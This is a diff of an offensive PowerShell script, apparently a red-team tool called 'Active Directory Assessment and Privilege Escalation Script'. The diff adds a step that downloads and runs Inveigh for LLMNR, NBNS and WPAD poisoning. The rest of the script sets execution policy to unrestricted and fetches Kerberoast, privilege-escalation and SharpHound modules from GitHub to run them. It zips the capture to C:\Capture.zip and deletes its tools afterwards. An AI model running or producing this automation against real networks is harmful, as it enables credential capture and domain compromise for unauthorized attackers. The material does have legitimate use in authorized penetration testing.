@@ -1,9 +1,9 @@
 Write-Host "###########################################################################################################" -ForegroundColor Green
-Write-Host "##   Active Directory Assessment and Privilege Escalation Script v1.2                                    ##" -ForegroundColor Green
-Write-Host "##   Developed By @Haus3c                                                                                 ##" -ForegroundColor Green
+Write-Host "##   Active Directory Assessment and Privilege Escalation Script v1.3                                    ##" -ForegroundColor Green
+Write-Host "##   Developed By @Haus3c                                                                                ##" -ForegroundColor Green
 Write-Host "##                                                                                                       ##" -ForegroundColor Green
-Write-Host "##   Credit for .ps1s goes to Tim Medin, and the people working on Empire, BloodHound, and PowerSploit   ##" -ForegroundColor Green
-Write-Host "##                                                                                                       ##" -ForegroundColor Green
+Write-Host "##   Credit for .ps1s goes to Tim Medin, Kevin Robertson, and the people working on Empire, BloodHound,  ##" -ForegroundColor Green
+Write-Host "##   and PowerSploit                                                                                     ##" -ForegroundColor Green
 Write-Host "##   If you see errors, that's normal. Unless your computer bluescreens or something. That's not normal. ##" -ForegroundColor Green
 Write-Host "###########################################################################################################" -ForegroundColor Green
 Set-ExecutionPolicy Unrestricted
@@ -32,6 +32,37 @@ $ErrorActionPreference= 'silentlycontinue'
 $modulepath=$env:psmodulepath.split(';')[0].split(' ')
 Write-Host "Using Module path: $modulepath" -ForegroundColor Green
 
+#Inveigh
+If(!(test-path $modulepath/Inv))
+{
+      New-Item -ItemType Directory -Force -Path $modulepath/Inv | Out-Null
+}
+Write-Host "Fetching PowerUp module..."
+
+$client.DownloadFile("https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1","$modulepath/Inv/Inv.psm1")
+If (Test-Path $modulepath/Inv/Inv.psm1 -PathType Leaf)
+{
+	Write-Host "Download Successful" 
+	Import-Module Inv.psm1
+	Write-Host "Attemping WPAD, LLMNR, and NBTNS poisoning" -ForegroundColor Yellow
+	Invoke-Inveigh -ConsoleOutput N -NBNS Y -mDNS Y -HTTPS Y -FileOutput Y -FileOutputDirectory $path -RunTime 5
+}
+else
+{
+	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
+	Copy-Item "$modules/Inv.ps1" -Destination "$modulepath/Inv/Inv.psm1"
+		If (Test-Path $modulepath/Inv/Inv.psm1 -PathType Leaf)
+			{
+				Write-Host "Copy Successful" 
+				Import-Module Inv.psm1
+				Write-Host "Attemping WPAD, LLMNR, and NBTNS poisoning" -ForegroundColor Yellow
+				Invoke-Inveigh -ConsoleOutput N -NBNS Y -mDNS Y -HTTPS Y -FileOutput Y -FileOutputDirectory $path -RunTime 5
+			}
+		else
+			{
+				Write-Host "Error copying from local file...is the module in the same folder as this script?" -ForegroundColor Red
+			}
+}
 #Kerberoast
 If(!(test-path $modulepath/Kerberoast))
 {
@@ -71,7 +102,7 @@ If(!(test-path $modulepath/Sharp))
       New-Item -ItemType Directory -Force -Path $modulepath/Sharp | Out-Null
 }
 Write-Host "Fetching BloodHound module..."
-$download = (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/BloodHoundAD/BloodHound/1.5/Ingestors/SharpHound.ps1")
+$download = (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1")
 $Encode = [System.Text.Encoding]::Unicode.GetBytes(($download))
 $Base64 = [Convert]::ToBase64String($Encode)
 $Decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Base64))
@@ -111,7 +142,7 @@ If(!(test-path $modulepath/Sharp))
 
 Write-Host "Fetching Sharphound.exe..."
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$client.DownloadFile("https://github.com/BloodHoundAD/BloodHound/blob/1.5/Ingestors/SharpHound.exe?raw=true","$modulepath/Sharp/Sharp.exe")
+$client.DownloadFile("https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe?raw=true","$modulepath/Sharp/Sharp.exe")
 If (Test-Path $modulepath/Sharp/Sharp.exe -PathType Leaf)
 {
 	Write-Host "Download Successful" 
@@ -255,6 +286,7 @@ else
 }
 
 #Zip it all up and remove leftovers
+Stop-Inveigh
 Compress-Archive -Path $path -Update -DestinationPath C:\Capture.zip
 Remove-Item -Recurse -Force "$modulepath/Kerberoast"
 Remove-Item -Recurse -Force "$modulepath/PrivEsc"
